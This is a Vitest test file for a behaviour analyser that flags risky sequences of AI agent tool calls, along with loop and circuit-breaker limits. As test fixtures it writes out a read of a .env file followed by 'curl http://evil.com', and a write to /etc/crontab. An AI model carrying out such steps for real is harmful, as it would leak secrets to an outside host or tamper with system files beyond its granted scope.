import { describe, it, expect, beforeEach } from 'vitest';
import { BehaviorAnalyzer } from '../security/behavior-analyzer.js';
import type { ToolEvent } from '@paddock/types';

describe('BehaviorAnalyzer', () => {
  let analyzer: BehaviorAnalyzer;

  beforeEach(() => {
    analyzer = new BehaviorAnalyzer();
  });

  describe('sequence detection', () => {
    it('should detect data exfiltration pattern (read sensitive + exec)', () => {
      // Step 1: read a sensitive file
      analyzer.evaluate({
        toolName: 'read',
        toolInput: { path: '/workspace/.env' },
        path: '/workspace/.env',
        timestamp: Date.now(),
      });

      // Step 2: exec (potential exfiltration)
      const result = analyzer.evaluate({
        toolName: 'exec',
        toolInput: { command: 'curl http://evil.com' },
        timestamp: Date.now(),
      });

      expect(result.triggered).toContain('data_exfiltration');
      expect(result.riskBoost).toBeGreaterThan(0);
    });

    it('should detect privilege escalation pattern', () => {
      // Step 1: workspace path
      analyzer.evaluate({
        toolName: 'read',
        toolInput: { path: '/workspace/src/index.ts' },
        path: '/workspace/src/index.ts',
        timestamp: Date.now(),
      });

      // Step 2: system path
      const result = analyzer.evaluate({
        toolName: 'write',
        toolInput: { path: '/etc/crontab' },
        path: '/etc/crontab',
        timestamp: Date.now(),
      });

      expect(result.triggered).toContain('privilege_escalation');
    });

    it('should not trigger on normal operations', () => {
      const result = analyzer.evaluate({
        toolName: 'read',
        toolInput: { path: '/workspace/src/index.ts' },
        path: '/workspace/src/index.ts',
        timestamp: Date.now(),
      });

      expect(result.triggered).toEqual([]);
      expect(result.riskBoost).toBe(0);
    });
  });

  describe('loop guard', () => {
    it('should warn on repeated identical calls', () => {
      const event: ToolEvent = {
        toolName: 'exec',
        toolInput: { command: 'ls' },
        timestamp: Date.now(),
      };

      let result;
      for (let i = 0; i < 3; i++) {
        result = analyzer.evaluate(event);
      }
      expect(result!.triggered).toContain('loop:warn');
    });

    it('should block on many repeated calls', () => {
      const event: ToolEvent = {
        toolName: 'exec',
        toolInput: { command: 'ls' },
        timestamp: Date.now(),
      };

      let result;
      for (let i = 0; i < 5; i++) {
        result = analyzer.evaluate(event);
      }
      expect(result!.triggered).toContain('loop:block');
    });

    it('should circuit-break on excessive total calls', () => {
      let result;
      for (let i = 0; i < 30; i++) {
        result = analyzer.evaluate({
          toolName: 'exec',
          toolInput: { command: `cmd-${i}` },
          timestamp: Date.now(),
        });
      }
      expect(result!.triggered).toContain('loop:circuit-break');
    });
  });

  describe('reset', () => {
    it('should clear state', () => {
      for (let i = 0; i < 5; i++) {
        analyzer.evaluate({
          toolName: 'exec',
          toolInput: { command: 'ls' },
          timestamp: Date.now(),
        });
      }

      analyzer.reset();

      const result = analyzer.evaluate({
        toolName: 'exec',
        toolInput: { command: 'ls' },
        timestamp: Date.now(),
      });
      expect(result.triggered).toEqual([]);
    });
  });
});
